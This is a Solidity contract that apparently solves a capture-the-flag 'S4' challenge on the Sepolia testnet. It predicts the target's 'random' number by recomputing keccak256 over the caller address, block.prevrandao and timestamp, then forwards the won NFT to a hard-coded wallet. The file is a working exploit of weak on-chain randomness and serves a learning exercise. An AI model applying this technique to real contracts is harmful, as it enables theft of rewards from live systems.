// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {console} from "lib/forge-std/src/console.sol"; 


interface IS4  { 
  // contrct address in Sepolia: 0xf988Ebf9D801F4D3595592490D7fF029E438deCa
  function solveChallenge(uint256 guess, string memory yourTwitterHandle) external;
  function description() external pure returns (string memory);
  function specialImage() external pure returns (string memory);
}

contract S4_Challenge is IERC721Receiver {
 
    address private boss;
    uint256 private myToken;
    IS4 public s4;

      constructor() {
        boss = msg.sender; 
        address add = 0xf988Ebf9D801F4D3595592490D7fF029E438deCa;
        s4 = IS4(add);
      }


    function descriptionAttack() public view returns (string memory){
        string memory description = s4.description();
        // console.log("description: ", description);
        return description;
    }

    function mySolution() public {
      s4.solveChallenge(1 ,"mysolution");
    }

    function owner() public view returns (address) {
      return address(this);
    }

    
    function go() public returns (bool) {

      string memory twitter = "chamdev1";
      uint256 rng = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
      
      s4.solveChallenge(rng ,twitter);
    
      return true;
    }


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {

       myToken = tokenId;

      //  address erc721Contract = 0x31801c3e09708549c1b2c9E1CFbF001399a1B9fa;
       address wallet = 0x05E3Bd725678352E24d79D2266e12129EdB69474; // This is my wallet address where NFT will be stored

        // Transfer the received ERC721 token to the specified wallet address
        IERC721(msg.sender).safeTransferFrom(address(this), wallet, tokenId);

        return this.onERC721Received.selector;
    }
}